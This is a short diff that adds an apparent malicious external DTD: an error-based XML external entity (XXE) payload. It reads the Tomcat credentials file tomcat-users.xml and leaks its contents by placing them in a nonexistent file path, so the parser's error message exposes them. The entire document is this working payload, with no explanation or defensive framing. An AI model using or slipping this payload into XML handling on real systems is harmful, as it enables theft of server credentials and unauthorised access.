@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///mdf/app/tomcat/conf/tomcat-users.xml">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '/thisisnotafile/%file;'>">
+%eval;
+%exfiltrate;
